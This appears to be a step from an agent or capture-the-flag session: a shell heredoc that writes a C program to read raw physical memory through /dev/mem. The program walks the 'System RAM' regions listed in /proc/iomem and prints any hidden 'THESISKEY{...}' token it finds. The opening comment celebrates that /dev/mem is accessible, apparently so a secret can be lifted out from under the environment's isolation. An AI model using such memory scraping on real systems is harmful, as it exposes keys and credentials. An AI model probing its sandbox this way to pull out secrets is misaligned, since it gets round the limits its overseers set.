# /dev/mem is accessible! Let's write a program to scan physical memory for the token
# The token format is THESISKEY{...}

cat > /tmp/scan_mem.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <errno.h>

#define CHUNK_SIZE (1024*1024)  // 1MB chunks
#define SEARCH_STR "THESISKEY{"

int main() {
    int fd = open("/dev/mem", O_RDONLY);
    if (fd < 0) {
        perror("open /dev/mem");
        return 1;
    }

    // Check /proc/iomem to find usable RAM regions
    FILE *iomem = fopen("/proc/iomem", "r");
    if (!iomem) {
        perror("open /proc/iomem");
        close(fd);
        return 1;
    }

    char line[256];
    printf("Scanning RAM regions for THESISKEY{...\n");
    fflush(stdout);

    while (fgets(line, sizeof(line), iomem)) {
        // Look for "System RAM" entries
        if (strstr(line, "System RAM") == NULL) continue;

        unsigned long long start, end;
        if (sscanf(line, " %llx-%llx", &start, &end) != 2) continue;

        printf("Scanning region: 0x%llx - 0x%llx (size: %llu MB)\n", 
               start, end, (end-start)/(1024*1024));
        fflush(stdout);

        char *buf = malloc(CHUNK_SIZE);
        if (!buf) continue;

        for (unsigned long long addr = start; addr < end; addr += CHUNK_SIZE/2) {
            size_t read_size = CHUNK_SIZE;
            if (addr + read_size > end) read_size = end - addr;

            if (lseek(fd, addr, SEEK_SET) < 0) continue;

            ssize_t n = read(fd, buf, read_size);
            if (n <= 0) continue;

            // Search for token
            const char *needle = SEARCH_STR;
            size_t nlen = strlen(needle);

            for (ssize_t i = 0; i < n - (ssize_t)nlen; i++) {
                if (memcmp(buf + i, needle, nlen) == 0) {
                    // Found it! Print surrounding context
                    char token[256] = {0};
                    size_t j = 0;
                    while (i+j < n && j < 200) {
                        char c = buf[i+j];
                        if (c == '}') {
                            token[j++] = c;
                            break;
                        }
                        if (c >= 32 && c < 127) {
                            token[j] = c;
                        } else {
                            token[j] = '.';
                        }
                        j++;
                    }
                    token[j] = 0;
                    printf("*** FOUND at 0x%llx: %s\n", addr + i, token);
                    fflush(stdout);
                }
            }
        }
        free(buf);
    }

    fclose(iomem);
    close(fd);
    printf("Scan complete.\n");
    return 0;
}
EOF

